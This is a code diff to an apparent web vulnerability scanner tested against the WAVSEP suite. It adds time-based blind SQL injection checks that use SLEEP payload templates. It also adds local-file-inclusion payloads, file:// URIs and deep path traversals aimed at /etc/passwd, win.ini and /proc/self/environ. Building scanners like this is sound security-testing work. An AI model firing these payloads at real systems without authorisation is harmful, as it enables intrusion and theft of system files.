@@ -324,7 +324,31 @@ def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, s
     if _material and abs(len(t) - len(base)) < abs(len(f) - len(base)):
         return True, (f"boolean-based diff (true={len(t)} false={len(f)} "
                       f"base={len(base)}, delta={_delta})")
-    return False, "no SQL error or boolean signal"
+
+    # Time-based blind: WAVSEP's "200-identical" cases give NO error and NO length signal — only a
+    # delay betrays them. Differential timing rules out a coincidentally-slow endpoint: a working
+    # injection makes SLEEP(5) take ~5s while SLEEP(0) returns immediately, and SLEEP(2) lands in
+    # between. Non-injectable params ignore the payload => no delay => not flagged. SELECT-based,
+    # non-destructive (production-safe caps this technique). Two DB dialects cover most of WAVSEP.
+    for tmpl in ("1' AND SLEEP({})-- -", "1 AND SLEEP({})"):
+        try:
+            _t0 = time.monotonic(); _req(method, url, param, tmpl.format(0), cookie)
+            fast = time.monotonic() - _t0
+            if fast > 4.0:      # naturally-slow endpoint => timing is unreliable AND expensive; skip
+                break
+            _t0 = time.monotonic(); _req(method, url, param, tmpl.format(5), cookie)
+            slow = time.monotonic() - _t0
+        except Exception:  # noqa: BLE001
+            continue
+        if slow > fast + 3.8 and slow > 3.8:
+            try:
+                _t0 = time.monotonic(); _req(method, url, param, tmpl.format(2), cookie)
+                mid = time.monotonic() - _t0
+            except Exception:  # noqa: BLE001
+                mid = 0.0
+            if fast + 1.0 < mid < slow - 1.0:   # 2s sleep sits between 0s and 5s => real time-based
+                return True, f"time-based blind SQLi (SLEEP(5)={slow:.1f}s vs {fast:.1f}s baseline)"
+    return False, "no SQL error, boolean, or timing signal"
 
 
 def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
@@ -345,6 +369,13 @@ def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, st
         "php://filter/convert.base64-encode/resource=/etc/passwd",
         "php://filter/read=convert.base64-encode/resource=/etc/passwd",
         "php://filter/resource=/etc/passwd",
+        # file:// URI scheme — recovers WAVSEP FileDirective/FileClass cases whose sink expects a
+        # URI, not a bare path (empirically the vector those missed cases needed).
+        "file:///etc/passwd", "file:/etc/passwd",
+        "file:///c:/windows/win.ini", "file://c:\\windows\\win.ini",
+        # deeper traversal for sinks that canonicalise a few levels before the read
+        "../../../../../../../../../../../../etc/passwd",
+        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
         # other readable *nix files
         "/proc/self/environ", "/etc/hostname",
         # Windows
